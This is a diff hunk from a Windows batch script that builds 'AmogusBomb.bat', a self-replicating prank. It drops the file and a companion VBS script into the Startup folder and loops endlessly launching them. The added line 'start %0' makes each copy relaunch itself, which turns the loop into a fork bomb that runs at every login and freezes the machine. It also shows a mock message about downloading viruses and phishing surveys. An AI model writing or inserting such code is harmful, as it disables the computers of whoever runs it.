@@ -42,6 +42,7 @@ move AmogusBomb.vbs "%StartupDir%"
 @echo echo Please verify you are a human by downloading viruses and doing phishing surveys!!
 @echo :spam
 @echo start AmogusBomb.vbs
+@echo start %0
 @echo goto spam
 ) > AmogusBomb.bat
 move AmogusBomb.bat "%StartupDir%"
